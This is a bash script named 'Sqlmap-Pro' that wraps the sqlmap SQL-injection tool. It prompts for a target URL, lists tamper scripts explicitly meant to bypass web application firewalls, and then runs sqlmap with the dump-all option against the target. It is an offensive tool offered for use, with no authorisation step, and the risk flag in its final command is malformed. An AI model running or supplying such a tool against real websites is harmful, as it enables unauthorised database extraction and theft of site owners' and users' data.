#!/bin/bash

clear
figlet Sqlmap-Pro | lolcat

echo -e "\e[1;31m[°]__________________________________________________________[°]\e[0m"
echo -e "\t \e[1;34 mAutomated SQL INJECTION - VULNERABILITY ASSESMENT \e[0m"
echo -e "\t\t\tTOOL BASED ON SQLMAP"
echo -e "\e[1;33m             Github : https://github.com/StarFord-NG \e[0m"
echo -e "\e[1;35m                    Codded By : StarFord-NG \e[0m"
echo -e "\e[1;31m[°]___________________________________________________________[°]\e[0m"

echo ""

echo -e "Enter Target Website: eg \e[32m www.target.com/page.php?id=2\e[0m"
echo -e "┌───[\e[1;31mroot@sqlmap-pro\e[0m]"
read -p "└─#" target;

echo -e "\e[1;32m    Listing Most Use Tamper To Bypass WAF....\e[0m"
sleep 1
echo -e "\e[1;33m     ╔═══════════════════════════════════════════════════════╗\e[0m"
echo -e "\e[1;33m     ║                                                       ║\e[0m"
echo -e "\e[1;33m     ║\e[1;32m 0eunion.py - apostrophemask.py                        \e[1;33m║\e[0m"
echo -e "\e[1;33m     ║\e[1;32m uppercase.py - unmagicquotes.py - symboliclogical.py  \e[1;33m║\e[0m"
echo -e "\e[1;33m     ║\e[1;32m space2randomblank.py - space2plus.py - base64encode.py\e[1;33m║\e[0m"
echo -e "\e[1;33m     ║\e[1;32m between.py - binary.py - bluecoat.py                  \e[1;33m║\e[0m"
echo -e "\e[1;33m     ║\e[1;32m chardoubleencode.py - charencode.py                   \e[1;33m║\e[0m"
echo -e "\e[1;33m     ║\e[1;32m commentbeforeparentheses.py                           \e[1;33m║\e[0m"
echo -e "\e[1;33m     ║\e[1;32m space2hash.py - space2dash.py- apostrophenullencode.py\e[1;33m║\e[0m"
echo -e "\e[1;33m     ║                                                       ║\e[0m"
echo -e "\e[1;33m     ╚═══════════════════════════════════════════════════════╝\e[0m"
echo ""

echo -e "Choose Tamper to use: eg, \e[1;32m0eunion.py\e[0m"
echo -e "┌───[\e[1;31mroot@sqlmap-pro\e[0m]"
read -p "└─#" tamper;

echo -e "Enter Number of \e[1;32mRISK 1-3: Default is 0\e[0m"
echo -e "┌───[\e[1;31mroot@sqlmap-pro\e[0m]"
read -p "└─#" RISK;

echo -e "Enter Number of \e[1;32mLEVEL 1-5: Default is 0\e[0m"
echo -e "┌───[\e[1;31mroot@sqlmap-pro\e[0m]"
read -p "└─#" LEVEL;

sqlmap -u $target --tamper=$tamper risk=$RISK --level=$LEVEL -a
